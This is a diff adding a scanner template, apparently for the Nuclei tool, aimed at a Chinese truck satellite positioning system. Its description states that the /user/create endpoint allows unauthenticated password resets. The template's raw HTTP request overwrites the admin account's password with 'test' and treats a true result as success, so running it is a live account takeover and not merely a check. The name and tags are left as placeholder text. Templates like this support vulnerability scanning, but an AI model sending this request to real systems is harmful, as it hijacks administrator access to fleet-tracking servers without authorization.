@@ -1,0 +1,29 @@
+id: KCDW-user-create-restpasswd
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 卡车卫星定位系统  /user/create接口处存在未授权密码重置漏洞，恶意攻击者可能利用该漏洞重置用户密码，获取后台登录权限，使服务器处于不安全的状态
+  reference:
+    - https://blog.csdn.net/weixin_52204925/article/details/138144807
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /user/create HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Length: 206
+
+        account=admin&id=1&password=test&passwordRepeat=test&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":true'
